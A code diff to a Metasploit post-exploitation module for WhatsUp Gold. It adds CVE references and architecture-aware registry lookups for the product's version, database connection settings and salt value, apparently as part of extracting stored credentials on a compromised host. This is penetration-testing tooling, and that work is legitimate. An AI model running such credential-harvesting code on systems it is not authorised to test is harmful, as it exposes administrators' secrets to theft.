@@ -35,7 +35,15 @@ class MetasploitModule < Msf::Post
         'SessionTypes' => [ 'meterpreter' ],
         'License' => MSF_LICENSE,
         'References' => [
-          ['URL', 'https://blog.assetnote.io/2022/06/09/whatsup-gold-exploit/']
+          [ 'CVE', '2022-29845' ],
+          [ 'CVE', '2022-29846' ],
+          [ 'CVE', '2022-29847' ],
+          [ 'CVE', '2022-29848' ],
+          [ 'URL', 'https://nvd.nist.gov/vuln/detail/CVE-2022-29845' ],
+          [ 'URL', 'https://nvd.nist.gov/vuln/detail/CVE-2022-29846' ],
+          [ 'URL', 'https://nvd.nist.gov/vuln/detail/CVE-2022-29847' ],
+          [ 'URL', 'https://nvd.nist.gov/vuln/detail/CVE-2022-29848' ],
+          [ 'URL', 'https://blog.assetnote.io/2022/06/09/whatsup-gold-exploit/' ]
         ],
         'Actions' => [
           [
@@ -84,6 +92,12 @@ class MetasploitModule < Msf::Post
 
   def wug?
     @wug_build && @wug_build > ::Rex::Version.new('0')
+  end
+
+  def x64?
+    return true if sysinfo['Architecture'] == ARCH_X64
+
+    false
   end
 
   def run
@@ -272,18 +286,31 @@ class MetasploitModule < Msf::Post
   end
 
   def get_wug_version
-    wug_version = nil
-    reg_keys = [
-      'HKLM\\SOFTWARE\\WOW6432Node\\Ipswitch\\Network Monitor\\WhatsUp Gold\\Setup',
-      'HKLM\\SOFTWARE\\Ipswitch\\Network Monitor\\WhatsUp Gold\\Setup',
-      'HKLM\\SOFTWARE\\Ipswitch\\Network Monitor\\WhatsUp Professional\\2007\\Setup'
-    ]
-    reg_keys.each do |reg_key|
-      next unless registry_key_exist?(reg_key)
-
-      break if (wug_version = registry_getvaldata(reg_key, 'Version').to_s)
+    target_key = nil
+    if x64?
+      reg_keys = [
+        'HKLM\\SOFTWARE\\WOW6432Node\\Ipswitch\\Network Monitor\\WhatsUp Gold\\Setup',
+        'HKLM\\SOFTWARE\\WOW6432Node\\Ipswitch\\Network Monitor\\WhatsUp Professional\\2007\\Setup'
+      ]
+    else
+      reg_keys = [
+        'HKLM\\SOFTWARE\\Ipswitch\\Network Monitor\\WhatsUp Gold\\Setup',
+        'HKLM\\SOFTWARE\\Ipswitch\\Network Monitor\\WhatsUp Professional\\2007\\Setup'
+      ]
     end
-    if wug_version.empty?
+    reg_keys.each do |reg_key|
+      if registry_key_exist?(reg_key)
+        target_key = reg_key
+        break
+      end
+    end
+    if target_key.nil?
+      print_error('Unable to locate WhatsUp Gold Setup key in registry')
+      @wug_build = nil
+      return nil
+    end
+    wug_version = registry_getvaldata(target_key, 'Version').to_s
+    if wug_version.nil? || wug_version.empty?
       print_error('WhatsUp Gold does not appear to be installed')
       @wug_build = nil
       return nil
@@ -358,28 +385,34 @@ class MetasploitModule < Msf::Post
   def get_wug_database_config
     db_str = nil
     target_key = nil
-    reg_keys = [
-      'HKLM\\SOFTWARE\\WOW6432Node\\Ipswitch\\Network Monitor\\WhatsUp Engine\\Database Settings',
-      'HKLM\\SOFTWARE\\Ipswitch\\Network Monitor\\WhatsUp Engine\\Database Settings',
-      'HKLM\\SOFTWARE\\Ipswitch\\Network Monitor\\WhatsUp Engine\\2007\\Database Settings'
-    ]
+    if x64?
+      reg_keys = [
+        'HKLM\\SOFTWARE\\WOW6432Node\\Ipswitch\\Network Monitor\\WhatsUp Engine\\Database Settings',
+        'HKLM\\SOFTWARE\\WOW6432Node\\Ipswitch\\Network Monitor\\WhatsUp Engine\\2007\\Database Settings'
+      ]
+    else
+      reg_keys = [
+        'HKLM\\SOFTWARE\\Ipswitch\\Network Monitor\\WhatsUp Engine\\Database Settings',
+        'HKLM\\SOFTWARE\\Ipswitch\\Network Monitor\\WhatsUp Engine\\2007\\Database Settings'
+      ]
+    end
     reg_keys.each do |reg_key|
-      next unless registry_key_exist?(reg_key)
-
-      if !registry_getvaldata(reg_key, 'Version').to_s.empty?
+      if registry_key_exist?(reg_key)
         target_key = reg_key
         break
       end
     end
+    fail_with(Msf::Exploit::Failure::NoTarget, 'Unable to locate WUG Database Settings in registry') if target_key.nil?
+
     reg_values = [
       'DataSource',
       'DataSource_WhatsUp'
     ]
     reg_values.each do |reg_value|
-      break if (db_str = registry_getvaldata(target_key, reg_value).to_s.delete("\000"))
+      break if (db_str = registry_getvaldata(target_key, reg_value, REGISTRY_VIEW_32_BIT).to_s.delete("\000"))
     end
     if db_str.nil? || db_str.empty?
-      wug_dsn_str = registry_getvaldata(target_key, 'DSN').to_s.delete("\000")
+      wug_dsn_str = registry_getvaldata(target_key, 'DSN', REGISTRY_VIEW_32_BIT).to_s.delete("\000")
       wug_dsn = wug_dsn_str.split('=')[1]
       dsn_reg_key = "HKLM\\SOFTWARE\\ODBC\\ODBC.INI\\#{wug_dsn}"
       res = parse_odbc_dsn(dsn_reg_key)
@@ -477,18 +510,17 @@ class MetasploitModule < Msf::Post
   end
 
   def wug_get_salt_value
-    salt_str = nil
     vprint_status('Get WhatsUp Gold dynamic salt from registry ...')
-    reg_keys = [
-      'HKLM\\SOFTWARE\\WOW6432Node\\Ipswitch\\Network Monitor\\WhatsUp Gold',
-      'HKLM\\SOFTWARE\\Ipswitch\\Network Monitor\\WhatsUp Gold'
-    ]
-    reg_keys.each do |reg_key|
-      next unless registry_key_exist?(reg_key)
-
-      salt_str = registry_getvaldata(reg_key, 'SerialNumber').to_s.delete("\000")
-      break unless salt_str.empty?
+    if x64?
+      reg_key = 'HKLM\\SOFTWARE\\WOW6432Node\\Ipswitch\\Network Monitor\\WhatsUp Gold'
+    else
+      reg_key = 'HKLM\\SOFTWARE\\Ipswitch\\Network Monitor\\WhatsUp Gold'
     end
+    if !registry_key_exist?(reg_key)
+      vprint_warning('Could not locate WhatsUp Gold registry key')
+      return nil
+    end
+    salt_str = registry_getvaldata(reg_key, 'SerialNumber').to_s.delete("\000")
     if salt_str.nil? || salt_str.empty?
       vprint_warning('Could not read SerialNumber from registry')
       return nil
